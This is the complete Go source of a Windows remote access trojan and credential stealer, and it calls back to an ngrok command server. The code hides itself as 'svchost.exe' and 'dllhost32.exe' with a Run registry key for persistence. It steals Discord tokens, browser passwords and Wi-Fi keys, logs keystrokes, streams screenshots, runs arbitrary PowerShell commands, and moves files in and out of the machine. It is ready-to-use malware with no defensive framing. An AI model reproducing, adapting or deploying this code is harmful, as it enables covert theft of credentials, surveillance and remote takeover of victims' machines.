package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/atotto/clipboard"
	"github.com/go-toast/toast"
	"github.com/kbinani/screenshot"
	"github.com/lxn/walk"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	_ "modernc.org/sqlite"
	"github.com/shirou/gopsutil/v4/cpu"
	"github.com/shirou/gopsutil/v4/host"
	"github.com/shirou/gopsutil/v4/mem"
)

var (
	System      Connection
	active      = false
	logging     = false
	information interface{}
	DATA        strings.Builder
	streaming   = false

	STARTUP = filepath.Join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	PATH    = filepath.Join(APPDATA, "subdir")
	SELF, _ = os.Executable()
	RUN     = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

	APPDATA = os.Getenv("APPDATA")
	LOCAL   = os.Getenv("LOCALAPPDATA")

	CAPS = false
	LOG  strings.Builder

	KEYS = map[string]string{
		"LMENU":      "L_ALT",
		"RMENU":      "R_ALT",
		"OEM_PERIOD": ".",
		"OEM_COMMA":  ",",
		"OEM_PLUS":   "+",
		"OEM_MINUS":  "-",
		"OEM_2":      "/",
		"OEM_7":      "'",
		"OEM_1":      ";",
		"OEM_6":      "]",
		"OEM_4":      "[",
		"OEM_5":      "\\",
		"OEM_3":      "`",
		"SPACE":      "<SPACE>",
		"BACK":       "<BACK>",
	}

	REGEX = regexp.MustCompile(`[\w-]{24,26}\.[\w-]{6}\.[\w-]{38}`)

	TOKEN_PATHS = [6]string{
		filepath.Join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
		filepath.Join(LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
		filepath.Join(LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
		filepath.Join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
		filepath.Join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
		filepath.Join(APPDATA, "discord", "Local Storage", "leveldb"),
	}

	LOCAL_PATHS = [6]string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Local State"),
		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Local State"),
		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local State"),
	}

	LOGIN_PATHS = [6]string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "Login Data"),
		filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data"),
	}
)

type Connection struct {
	Country string `json:"country_name"`
	conn    net.Conn
	reader  bufio.Reader
	writer  bufio.Writer
}

func getIp() string {
	resp, _ := http.Get("https://api.ipify.org/?format=txt")
	body, _ := io.ReadAll(resp.Body)
	return string(body)

}

func getLocation(ip string) {
	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", ip))
	json.NewDecoder(resp.Body).Decode(&System)
}

func connectToServer(ip string, port int) {
	client, err := net.Dial("tcp", fmt.Sprintf("%v:%v", ip, port))
	if err == nil {
		System = Connection{"NULL", client, *bufio.NewReader(client), *bufio.NewWriter(client)}
		IPv4 := getIp()
		getLocation(IPv4)
		writeResponse(fmt.Sprintf("%v;%v;%v;%v\n", IPv4, System.Country, os.Getenv("USERNAME"), runtime.GOOS))
		active = true
	} else {
		time.Sleep(time.Second * 5)
	}
}

func persist() {
	os.Mkdir(PATH, 0644)

	PATH_UTF16 := syscall.StringToUTF16Ptr(PATH)
	syscall.SetFileAttributes(PATH_UTF16, syscall.FILE_ATTRIBUTE_HIDDEN)

	DATA, _ := os.ReadFile(SELF)
	os.WriteFile(filepath.Join(STARTUP, "svchost.exe"), DATA, 0644)
	os.WriteFile(filepath.Join(PATH, "dllhost32.exe"), DATA, 0644)

	key, _ := registry.OpenKey(registry.CURRENT_USER, RUN, registry.ALL_ACCESS)
	key.SetStringValue("dllhost32", fmt.Sprintf("\"%v\"", filepath.Join(PATH, "svchost.exe")))
}

func writeResponse(response string) {
	System.writer.WriteString(response + "\n")
	System.writer.Flush()
}

func run(command string) string {
	cmd := exec.Command("powershell.exe", "-NoLogo", "-NonInteractive", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ := cmd.Output()
	return strings.TrimSpace(string(out))
}

func notify(appname string, title string, message string) {
	notification := toast.Notification{
		AppID:   appname,
		Title:   title,
		Message: message,
		Audio:   toast.Default,
	}
	notification.Push()
}

func ipInfo() {
	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", getIp()))
	json.NewDecoder(resp.Body).Decode(&information)
	body, _ := json.MarshalIndent(information, "", " ")
	DATA.WriteString(fmt.Sprintf("=============================[IP]==============================\n%v\n", string(body)))
}

func discordInfo() {
	for _, PATH := range TOKEN_PATHS {
		FILES, err := os.ReadDir(PATH)
		if err != nil {
			continue
		}
		for _, FILE := range FILES {
			if strings.HasSuffix(FILE.Name(), ".ldb") || strings.HasSuffix(FILE.Name(), ".log") {
				FILE_BYTES, _ := os.ReadFile(filepath.Join(PATH, FILE.Name()))
				LINES := strings.Split(string(FILE_BYTES), "\n")
				for _, LINE := range LINES {
					TOKENS := REGEX.FindAllString(LINE, -1)
					for _, TOKEN := range TOKENS {
						REQ, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
						REQ.Header.Set("Authorization", TOKEN)
						RESP, _ := http.DefaultClient.Do(REQ)
						if RESP.StatusCode == http.StatusOK {
							json.NewDecoder(RESP.Body).Decode(&information)
							BODY, _ := json.MarshalIndent(information, "", " ")
							DATA.WriteString(fmt.Sprintf("===========================[Discord]===========================\nTOKEN: %v\n%v\n", TOKEN, string(BODY)))
						}
					}
				}
			}
		}
	}
}

func CryptUnprotectedData(data []byte) []byte {
	var outBlob windows.DataBlob
	var inBlob = windows.DataBlob{Size: uint32(len(data)), Data: &data[0]}

	windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)

	return unsafe.Slice(outBlob.Data, outBlob.Size)
}

func extractKey(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var result map[string]interface{}
	json.Unmarshal(data, &result)

	encodedKey, _ := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	decodedKey, _ := base64.StdEncoding.DecodeString(encodedKey)

	return CryptUnprotectedData(decodedKey[5:])
}

func decryptData(encryptedData []byte, encryptionKey []byte) string {
	aesCipher, _ := aes.NewCipher(encryptionKey)
	gcmCipher, _ := cipher.NewGCM(aesCipher)

	nonceSize := gcmCipher.NonceSize()
	nonce := encryptedData[:nonceSize]
	ciphertext := encryptedData[nonceSize:]

	plaintext, _ := gcmCipher.Open(nil, nonce, ciphertext, nil)
	return string(plaintext)
}

func browserInfo() {
	defer os.Remove(".\\vault.db")
	for i, localPath := range LOCAL_PATHS {
		if _, err := os.Stat(localPath); err == nil {
			data, _ := os.ReadFile(LOGIN_PATHS[i])
			os.WriteFile(".\\vault.db", data, 0644)

			db, err := sql.Open("sqlite", ".\\vault.db")
			if err != nil {
				continue
			}
			defer db.Close()

			rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")
			defer rows.Close()

			for rows.Next() {
				fmt.Println("X")
				var url, username, encryptedPassword string
				rows.Scan(&url, &username, &encryptedPassword)
				fmt.Println("Y")
				if strings.HasPrefix(encryptedPassword, "v10") {
					password := decryptData([]byte(strings.TrimPrefix(encryptedPassword, "v10")), extractKey(localPath))
					if password != "" {
						DATA.WriteString(fmt.Sprintf("==========================[Login]=============================\nURL: %v\nUSERNAME: %v\nPASSWORD: %v\n\n", url, username, password))
					}
				}
			}
		}
	}
}

func wifiInfo() {
	profiles := run("netsh wlan show profiles")
	lines := strings.Split(profiles, "\n")
	for _, line := range lines {
		if strings.Contains(line, ":") {
			profile := strings.TrimSpace(strings.Split(line, ":")[1])
			if len(profile) > 0 {
				DATA.WriteString(fmt.Sprintf("==========================[Wifi]============================\n%v\n", run(fmt.Sprintf("netsh wlan show profile %v key=clear", profile))))
			}
		}
	}
}

func sysInfo() {
	CURRENT_USER, _ := user.Current()
	memInfo, _ := mem.VirtualMemory()
	cpuInfo, _ := cpu.Info()
	hostInfo, _ := host.Info()

	DATA.WriteString(fmt.Sprintf("=========================[SYSTEM]=========================\nOS: %v (%v)\nArchitecure: %v (%v)\nHostname: %v\nFull Name: %v\nHome: %v\nUser ID: %v\nRAM: %v GB\nCPU: %v (%v cores)\nEnvironment: %v\n\n",
		hostInfo.Platform,
		hostInfo.PlatformVersion,
		runtime.GOARCH,
		hostInfo.KernelArch,
		CURRENT_USER.Username,
		CURRENT_USER.Name,
		CURRENT_USER.HomeDir,
		CURRENT_USER.Uid,
		(memInfo.Total / 1024 / 1024 / 1024),
		cpuInfo[0].ModelName,
		len(cpuInfo),
		os.Environ(),
	))
}

func fetchData() {
	sysInfo()
	ipInfo()
	discordInfo()
	browserInfo()
	wifiInfo()

	writeResponse("<START>")
	writeResponse(DATA.String())
	writeResponse("<END>")
	DATA.Reset()
}

func stream() {
	for streaming {
		img, _ := screenshot.CaptureDisplay(0)
		jpeg.Encode(System.conn, img, nil)
		time.Sleep(time.Millisecond * 50)
	}
}

func listenKeystrokes(stat bool) {
	logging = stat
	channel := make(chan types.KeyboardEvent, 100)
	keyboard.Install(nil, channel)
	for logging {
		key := <-channel
		char := strings.Replace(key.VKCode.String(), "VK_", "", 1)
		if value, exists := KEYS[char]; exists {
			char = value
		}
		switch key.Message {
		case types.WM_KEYDOWN:
			switch key.VKCode {
			case types.VK_CAPITAL:
				CAPS = !CAPS
				if CAPS {
					LOG.WriteString("<CAPITAL>\n")
				} else {
					LOG.WriteString("<capital>\n")
				}
			case types.VK_LSHIFT:
				CAPS = true
				LOG.WriteString("<SHIFT>\n")
			default:
				if CAPS {
					LOG.WriteString(char + "\n")
				} else {
					LOG.WriteString(strings.ToLower(char) + "\n")
				}
			}

		case types.WM_KEYUP:
			if key.VKCode == types.VK_LSHIFT {
				CAPS = false
				LOG.WriteString("</shift>\n")
			}
		}
	}
	keyboard.Uninstall()
}

func main() {
	persist()
	for {
		if active {
			command, err := System.reader.ReadString('\n')
			if err != nil {
				System.conn.Close()
				active = false
			}
			switch strings.TrimSpace(command) {
			case "\x01":
				fetchData()

			case "\x02":
				method, _ := System.reader.ReadString('\n')
				method = strings.TrimSpace(method)
				if method == "1" {
					writeResponse("<SHARE>")
					streaming = true
					go stream()
				} else {
					streaming = false
				}

			case "\x03":
				url, _ := System.reader.ReadString('\n')
				exec.Command("rundll32.exe", "url.dll,FileProtocolHandler", strings.TrimSpace(url)).Start()

			case "\x04":
				command, _ := System.reader.ReadString('\n')
				writeResponse("<START>")
				writeResponse(run(command))
				writeResponse("<END>")

			case "\x05":
				method, _ := System.reader.ReadString('\n')
				method = strings.TrimSpace(method)
				if method == "1" {
					content, _ := System.reader.ReadString('\n')
					clipboard.WriteAll(content)
				} else {
					content, _ := clipboard.ReadAll()
					writeResponse("<START>")
					writeResponse(content)
					writeResponse("<END>")
				}

			case "\x06":
				title, _ := System.reader.ReadString('\n')
				message, _ := System.reader.ReadString('\n')
				go walk.MsgBox(nil, title, message, walk.MsgBoxIconError)

			case "\x07":
				appid, _ := System.reader.ReadString('\n')
				title, _ := System.reader.ReadString('\n')
				message, _ := System.reader.ReadString('\n')
				go notify(appid, title, message)

			case "\x08":
				writeResponse("<SCREEN>")
				img, _ := screenshot.CaptureDisplay(0)
				jpeg.Encode(System.conn, img, nil)

			case "":
				method, _ := System.reader.ReadString('\n')
				method = strings.TrimSpace(method)
				if method == "1" && !logging {
					go listenKeystrokes(true)
				} else if logging {
					logging = false
					writeResponse("<LOG>")
					writeResponse(LOG.String())
					writeResponse("<END>")
					LOG.Reset()
				}

			case "\x10":
				exec.Command("cmd.exe", "/c", "shutdown /s /t 0").Start()

			case "\x11":
				exec.Command("cmd.exe", "/c", "shutdown /r /t 0").Start()

			case "\x12":
				exec.Command("rundll32.exe", "user32.dll,LockWorkStation").Start()

			case "\x13":
				path, _ := System.reader.ReadString('\n')
				data, err := os.ReadFile(strings.TrimSpace(path))
				if err == nil {
					writeResponse("<DOWNLOAD>")
					writeResponse(string(data))
					writeResponse("<END>")
				}

			case "\x14":
				var DATA strings.Builder
				filename, _ := System.reader.ReadString('\n')

				for {
					data, _ := System.reader.ReadString('\n')
					if strings.TrimSpace(data) == "<END>" {
						break
					} else {
						DATA.WriteString(data)
					}
				}
				os.WriteFile(strings.TrimSpace(filename), []byte(DATA.String()), 0644)
			}

			time.Sleep(time.Millisecond * 200)
		} else {
			connectToServer("4.tcp.eu.ngrok.io", 14089)
		}

	}
}
